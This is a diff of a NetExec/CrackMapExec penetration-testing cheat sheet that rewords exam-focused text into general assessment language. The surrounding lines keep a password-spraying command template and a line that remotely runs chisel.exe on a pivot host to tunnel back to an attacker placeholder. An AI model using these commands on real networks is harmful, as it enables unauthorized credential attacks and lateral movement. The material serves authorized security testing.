@@ -1,6 +1,6 @@
 # CrackMapExec / NetExec
 
-NetExec (`nxc`) is the successor to CrackMapExec (`cme`) — the Swiss-army knife for the PNPT internal exam. One tool sweeps a subnet, validates creds, sprays passwords, dumps hashes, and moves laterally across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, and VNC. All commands below use `nxc` syntax; `cme` accepts the same flags.
+NetExec (`nxc`) is the successor to CrackMapExec (`cme`) and provides a broad toolkit for internal network assessments. One tool sweeps a subnet, validates creds, sprays passwords, dumps hashes, and moves laterally across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, and VNC. All commands below use `nxc` syntax; `cme` accepts the same flags.
 
 {% hint style="info" %}
 The three colors tell the whole story: **green** = valid creds, **red** = invalid, **magenta** = valid creds that couldn't complete auth (disabled account, wrong logon hours, must-change password). A `(Pwn3d!)` after a green result means you have admin — that host is yours.
@@ -56,7 +56,7 @@ nxc <PROTOCOL> <TARGET> -u users_with_domains.txt -p '<PASS>'
 ### Password spraying
 
 {% hint style="danger" %}
-Get the password policy **before** you spray, or you'll lock out accounts and blow the engagement. Check `--pass-pol`, watch `badpwdcount`, and use `--jitter` + fail limits. Lockouts are a fast way to fail the PNPT.
+Get the password policy **before** you spray, or you'll lock out accounts and disrupt the engagement. Check `--pass-pol`, watch `badpwdcount`, and use `--jitter` + fail limits. Account lockouts can interrupt client operations and invalidate test results.
 {% endhint %}
 
 ```bash
@@ -389,7 +389,7 @@ nxc smb <PIVOT> -u <USER> -p '<PASS>' -x "C:\Windows\Temp\chisel.exe client <ATT
 proxychains4 -q nxc smb <INTERNAL_TARGET> -u <USER> -p '<PASS>' --shares
 ```
 
-## Exam workflow
+## Assessment workflow
 
 ```bash
 # 1. Host discovery + signing check (relay list for later)
